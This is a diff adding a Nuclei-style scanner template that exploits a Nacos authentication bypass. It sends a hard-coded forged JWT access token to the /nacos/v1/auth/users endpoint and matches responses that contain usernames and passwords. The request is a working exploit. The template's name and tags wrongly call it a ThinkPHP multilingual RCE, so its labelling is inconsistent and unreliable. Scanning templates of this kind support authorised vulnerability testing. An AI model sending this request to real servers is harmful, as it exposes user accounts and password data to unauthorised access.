@@ -1,0 +1,28 @@
+id: nacos-authentication-bypass
+info:
+  name: thinkphp-multilingual-module-rce
+  author: atk7r
+  severity: critical
+  reference:
+    - https://wx.zsxq.com/dweb2/index/footprint/241825525181841
+  tags: thinkphp
+requests:
+  - raw:
+      - |
+        GET /nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMDUwNDAxOX0.vW8mpBNoJ7hVKPNhEtQl4Z5b00G4P9Ktrn_7c58crOk HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: JSESSIONID=F61E144C7081FBFE6CDC6E70D7C6B29B
+        Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'username'
+          - 'password'
+        condition: and
